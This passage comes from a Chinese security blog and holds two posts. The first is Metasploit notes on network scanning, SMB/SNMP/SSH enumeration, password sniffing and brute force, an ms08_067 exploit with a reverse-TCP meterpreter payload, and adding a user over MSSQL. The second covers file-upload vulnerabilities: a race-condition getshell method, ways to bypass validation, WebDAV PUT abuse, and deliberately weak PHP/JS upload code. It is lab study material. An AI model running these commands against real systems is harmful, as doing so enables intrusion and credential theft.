<li>set RHOSTS 192.168.1.0/24 ；run</li>
<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
</ul>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
msf auxiliary(scanner/ip/ipidseq) &gt; show options 
msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
<li>use auxiliary/scanner/discovery/udp_sweep</li>
<li>use auxiliary/scanner/discovery/udp_probe</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
<li>use auxiliary/sniffer/psnuffle</li>
<li>支持从 pacap 抓包文件中提取密码</li>
<li>功能类似于 dsniff</li>
<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
</ul>
<pre><code>msf &gt; search sniffer
msf &gt; use auxiliary/sniffer/psnuffle
msf auxiliary(sniffer/psnuffle) &gt; show options 
msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(sniffer/psnuffle) &gt; show options
msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
msf auxiliary(sniffer/psnuffle) &gt; jobs
msf auxiliary(sniffer/psnuffle) &gt; kill 0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
<li>use auxiliary/scanner/snmp/snmp_login</li>
<li>use auxiliary/scanner/snmp/snmp_enum</li>
<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
<li>SMB 版本扫描<ul>
<li>use auxiliary/scanner/smb/smb_version</li>
</ul>
</li>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
<li>use auxiliary/scanner/smb/pipe_auditor</li>
</ul>
</li>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
</ul>
</li>
<li>SMB 共享账号（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumshares</li>
</ul>
</li>
<li>SMB 用户枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumusers</li>
</ul>
</li>
<li>SID 枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_lookupsid</li>
</ul>
</li>
<li>SMB 版本扫描</li>
</ul>
<pre><code>msf &gt; search smb
msf &gt; use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) &gt; show options 
msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
<li>SMB 共享账号（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
<li>SMB 用户枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
<li>SID 枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
<li>SSH 版本扫描<ul>
<li>use auxiliary/scanner/ssh/ssh_version</li>
</ul>
</li>
<li>SSH 密码爆破<ul>
<li>use auxiliary/scanner/ssh/ssh_login<ul>
<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 公钥登陆<ul>
<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 版本扫描</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
<li>SSH 密码爆破</li>
</ul>
<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 

msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
<li>SSH 公钥登陆</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
<li><p>基于已经取得的 session 进行检测</p>
</li>
<li><p>use post/windows/gather/enum_patches</p>
<ul>
<li>show advanced</li>
<li>set VERBOSE yes</li>
</ul>
</li>
<li><p>检查失败</p>
<ul>
<li>known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次进行尝试</li>
</ul>
</li>
<li><p>ms08-067</p>
</li>
</ul>
<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.147
msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) &gt; run</code></pre><p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p>
<pre><code>meterpreter &gt; backgroun
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions </code></pre><p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p>
<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/enum_patches
msf post(windows/gather/enum_patches) &gt; set SESSION 4
msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p>
<pre><code># 进程错误，迁移进程
msf post(windows/gather/enum_patches) &gt; sessions -i 4
meterpreter &gt; getpid
meterpreter &gt; ps
meterpreter &gt; migrate 828  # spoolsv.exe
meterpreter &gt; background 
msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p>
<h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
<li><p>mssql 扫描端口</p>
<ul>
<li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li>
<li>use auxiliary/scanner/mssql/mssql_ping</li>
</ul>
</li>
<li><p>爆破 mssql 密码</p>
</li>
<li><p>use auxiliary/scanner/mssql/mssql_login</p>
</li>
<li><p>远程执行代码（获取数据库权限之后）</p>
</li>
<li><p>use auxiliary/admin/mssql/mssql_exec</p>
<ul>
<li>set CMD net user user1 pass123 /ADD</li>
</ul>
</li>
<li><p>mssql扫描端口</p>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul>
<li><p>ftp 版本扫描</p>
<ul>
<li>use auxiliary/scanner/ftp/ftp_version</li>
<li>use auxiliary/scanner/ftp/anonymous</li>
<li>use auxiliary/scanner/ftp/ftp_login</li>
</ul>
</li>
<li><p>use auxiliary/scanner/ [tab]</p>
</li>
<li><p>Display all 479 possibilities? (y or n)</p>
</li>
<li><p>查询版本信息</p>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_version
msf (scanner/ftp/ftp_version) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p>
<ul>
<li><p>是否允许匿名登录</p>
<pre><code>msf &gt; use auxiliary/scanner/ftp/anonymous
msf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre></li>
</ul>
<p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p>
<ul>
<li><p>暴力破解</p>
<pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/" itemprop="url">文件上传漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:49:18+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="文件上传漏洞学习笔记-靶场实战"><a href="#文件上传漏洞学习笔记-靶场实战" class="headerlink" title="文件上传漏洞学习笔记+靶场实战"></a>文件上传漏洞学习笔记+靶场实战</h1><h4 id="一-什么是文件上传漏洞"><a href="#一-什么是文件上传漏洞" class="headerlink" title="一.什么是文件上传漏洞"></a>一.什么是文件上传漏洞</h4><p>  文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>关于PHP中$_FILES数组的使用方法</strong></p>
<pre><code>$_FILES\[‘file’][‘name’] 客户端文件名称

$_FILES\[‘file’][‘type’] 文件的MIME类型

$_FILES\[‘file’][‘size’] 文件大小 单位字节

$_FILES\[‘file’][‘tmp_name’] 文件被上传后在服务器端临时文件名，可以在php.ini中指定</code></pre><p>需要注意的是在文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，否则，脚本运行完毕后，自动删除临时文件，可以使用copy或者<code>move_uploaded_file</code>两个函数</p>
<h5 id="文件上传中常见的函数错误"><a href="#文件上传中常见的函数错误" class="headerlink" title="文件上传中常见的函数错误"></a>文件上传中常见的函数错误</h5><p><strong>这些函数有:<code>empty()、isset()、strpos()、rename()</code>等，如下面的代码:</strong></p>
<pre><code>#!php
if($operateId == 1){
    $date = date(&quot;Ymd&quot;);
    $dest = $CONFIG-&gt;basePath.&quot;data/files/&quot;.$date.&quot;/&quot;;
    $COMMON-&gt;createDir($dest);
    //if (!is_dir($dest))   mkdir($dest, 0777);
    $nameExt = strtolower($COMMON-&gt;getFileExtName($_FILES[&#39;Filedata&#39;][&#39;name&#39;]));
    $allowedType = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;png&#39;, &#39;jpeg&#39;);
    if(!in_array($nameExt, $allowedType)){
        $msg = 0;
    }
    if(empty($msg)){
        $filename = getmicrotime().&#39;.&#39;.$nameExt;
        $file_url = urlencode($CONFIG-&gt;baseUrl.&#39;data/files/&#39;.$date.&quot;/&quot;.$filename);
        $filename = $dest.$filename;
        if(empty($_FILES[&#39;Filedata&#39;][&#39;error&#39;])){
            move_uploaded_file($_FILES[&#39;Filedata&#39;][&#39;tmp_name&#39;],$filename);
        }
        if (file_exists($filename)){
            //$msg = 1;
            $msg = $file_url;
            @chmod($filename, 0444);
        }else{
            $msg = 0;
        }
    }
    $outMsg = &quot;fileUrl=&quot;.$msg;
    $_SESSION[&quot;eoutmsg&quot;] = $outMsg;
    exit;
}</code></pre><h4 id="历史经典漏洞再次爆发"><a href="#历史经典漏洞再次爆发" class="headerlink" title="历史经典漏洞再次爆发"></a>历史经典漏洞再次爆发</h4><p>条件竞争漏洞,这类历史经典漏洞在逐渐淡出人们视线的时候,再次爆发..</p>
<p>接着看下面这段代码(摘自某VPN系统)</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#!php</span>
<span class="token delimiter">&lt;?</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">mb_convert_encoding</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>file<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"GBK"</span><span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Pragma:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Length:"</span><span class="token punctuation">.</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition:attachment;filename=\"$file\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'realfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>上述代码的逻辑表面上看起来是这样的(对于攻击者来说)：</p>
<p>利用copy函数，将realfile生成shell.php-→删除掉shell.php</p>
<p>这样初看起来没办法利用，但是仔细一想, 这段代码其实是存在逻辑问题的，所以我们可以利用这个逻辑缺陷达到GetShell的目的。</p>
<p>具体利用方法：</p>
<p>copy成temp.php–&gt;不断访问temp.php-&gt;temp.php生成shell.php-&gt;删除temp.php</p>
<h4 id="校验方式分类-amp-总结"><a href="#校验方式分类-amp-总结" class="headerlink" title="校验方式分类&amp;总结"></a>校验方式分类&amp;总结</h4><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验</li>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h4 id="校验方式溯源"><a href="#校验方式溯源" class="headerlink" title="校验方式溯源"></a>校验方式溯源</h4><p>​    通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/523aeb43-b1a1-421b-b809-79ec1bdb06f8.png-w331s" alt="img"></p>
<h4 id="校验方式-amp-绕过姿势"><a href="#校验方式-amp-绕过姿势" class="headerlink" title="校验方式&amp;绕过姿势"></a>校验方式&amp;绕过姿势</h4><h5 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h5><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。当WebDAV开启PUT，MOVE，COPY，DELETE方法时，攻击者就可以向服务器上传危险脚本文件。</p>
<p>此时可以使用OPTIONS探测服务器支持的http方法，如果支持PUT，就进行上传脚本文件，在通过MOVE或COPY方法改名。当开启DELETE时还可以删除文件。</p>
<p>参考:<a href="http://wiki.wooyun.org/server:httpput" target="_blank" rel="noopener">http://wiki.wooyun.org/server:httpput</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><h5 id="JavaScript校验"><a href="#JavaScript校验" class="headerlink" title="JavaScript校验"></a>JavaScript校验</h5><p>验证代码</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token comment" spellcheck="true">//文件上传漏洞演示脚本之js验证</span>
$uploaddir <span class="token operator">=</span> <span class="token string">'uploads/'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span>$uploaddir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $uploaddir <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            echo <span class="token string">'文件上传成功，保存于：'</span> <span class="token punctuation">.</span> $uploaddir <span class="token punctuation">.</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>$uploaddir <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//print_r($_FILES);</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span>
    <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>head<span class="token operator">></span>
    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html;charset=gbk"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"content-language"</span> content<span class="token operator">=</span><span class="token string">"zh-CN"</span><span class="token operator">/</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>title<span class="token operator">></span>文件上传漏洞演示脚本<span class="token operator">--</span>JS验证实例<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
    <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
       <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upfile'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你还没有选择任何文件，不能上传!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">//定义允许上传的文件类型</span>
            <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.jpeg|.png|.gif|.bmp|"</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//提取上传文件的类型</span>
